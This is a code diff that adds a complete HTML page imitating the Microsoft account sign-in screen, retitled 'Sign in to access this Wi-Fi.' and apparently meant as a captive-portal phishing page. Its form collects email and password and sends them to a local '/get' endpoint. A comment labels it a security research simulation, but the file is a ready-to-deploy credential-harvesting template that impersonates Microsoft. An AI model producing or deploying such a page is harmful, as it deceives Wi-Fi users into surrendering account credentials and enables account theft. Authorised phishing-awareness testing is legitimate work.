@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Microsoft login simulation for security research purposes -->
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your Microsoft account</title>
+  <style>
+    :root {
+      --blue-dark: #0067b8;
+      --blue-light: #1081de;
+      --gray-light: #f2f2f2;
+      --gray-medium: #e6e6e6;
+      --gray-dark: #767676;
+      --black: #000000;
+      --white: #ffffff;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+      font-size: 14px;
+      line-height: 1.5;
+      color: #1b1b1b;
+      background-color: var(--white);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .header {
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--gray-medium);
+    }
+
+    .ms-logo {
+      height: 23px;
+    }
+
+    .centered-logo {
+    height: 80px;  /* Increased from previous smaller size */
+    margin-bottom: 20px;
+    width: auto;   /* Maintain aspect ratio */
+   }
+
+    .language-selector {
+      color: var(--gray-dark);
+      font-size: 12px;
+    }
+
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      flex-grow: 1;
+      padding: 20px;
+      width: 100%;
+    }
+
+    .login-box {
+      width: 100%;
+      max-width: 440px;
+      padding: 0 40px 20px;
+      margin: 0 auto;
+      text-align: center;
+    }
+
+    .login-title {
+      font-size: 24px;
+      font-weight: 600;
+      margin: 16px 0;
+    }
+
+    .login-form {
+      margin-top: 16px;
+      text-align: left;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      font-size: 13px;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--gray-dark);
+      border-radius: 3px;
+      font-size: 14px;
+      transition: border-color 0.1s;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: var(--blue-dark);
+      box-shadow: 0 0 0 2px rgba(0, 120, 215, 0.1);
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 10px 12px;
+      background-color: var(--blue-dark);
+      color: var(--white);
+      border: none;
+      border-radius: 3px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background-color 0.1s;
+    }
+
+    .submit-btn:hover {
+      background-color: var(--blue-light);
+    }
+
+    .forgot-password {
+      text-align: right;
+      margin: 8px 0 16px;
+    }
+
+    .forgot-password a {
+      color: var(--blue-dark);
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .signup-option {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 13px;
+      color: var(--black);
+    }
+
+    .signup-option a {
+      color: var(--blue-dark);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .footer {
+      padding: 24px 48px;
+      background-color: var(--gray-light);
+      color: var(--gray-dark);
+      font-size: 12px;
+      text-align: center;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 12px;
+    }
+
+    .footer-links a {
+      color: var(--gray-dark);
+      text-decoration: none;
+      margin: 0 12px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 12px;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+    }
+
+    .checkbox-group input {
+      margin-right: 8px;
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        padding: 0 20px;
+      }
+
+      .header {
+        padding: 12px 16px;
+      }
+
+      .footer {
+        padding: 16px;
+      }
+
+      .footer-links a {
+        margin: 0 8px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="header">
+    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDYiIGhlaWdodD0iNDYiIHZpZXdCb3g9IjAgMCA0NiA0NiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIGZpbGw9IiNmMjUwMjIiLz48cmVjdCB4PSIyMiIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjN2ZiYTAwIi8+PHJlY3QgeT0iMjIiIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0iIzAwYTRlZiIvPjxyZWN0IHg9IjIyIiB5PSIyMiIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+" alt="Microsoft" class="ms-logo">
+    <div class="language-selector">English (United States)</div>
+  </header>
+
+  <main class="main-container">
+    <div class="login-box">
+      <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTIiIGhlaWdodD0iOTIiIHZpZXdCb3g9IjAgMCA5MiA5MiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIGZpbGw9IiNmMjUwMjIiLz48cmVjdCB4PSI0NCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjN2ZiYTAwIi8+PHJlY3QgeT0iNDQiIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgZmlsbD0iIzAwYTRlZiIvPjxyZWN0IHg9IjQ0IiB5PSI0NCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+" alt="Microsoft" class="centered-logo">
+      <h1 class="login-title">Sign in to access this Wi-Fi.</h1>
+      
+      <form action="/get" method="GET" class="login-form">
+        <div class="form-group">
+          <label for="email" class="form-label">Email, phone, or Skype</label>
+          <input type="text" name="email" id="email" class="form-control" placeholder="someone@example.com" required autofocus>
+        </div>
+
+        <div class="form-group">
+          <label for="password" class="form-label">Password</label>
+          <input type="password" name="password" id="password" class="form-control" placeholder="Password" required>
+        </div>
+
+        <div class="forgot-password">
+          <a href="#">Forgot password?</a>
+        </div>
+
+        <div class="checkbox-group">
+          <input type="checkbox" id="keepSignedIn">
+          <label for="keepSignedIn">Keep me signed in</label>
+        </div>
+
+        <div class="form-group">
+          <button type="submit" class="submit-btn">Sign in</button>
+        </div>
+      </form>
+
+      <div class="signup-option">
+        No account? <a href="#">Create one!</a>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy & cookies</a>
+      <a href="#">Contact us</a>
+      <a href="#">About our ads</a>
+      <a href="#">&copy; Microsoft 2023</a>
+    </div>
+  </footer>
+</body>
+</html>
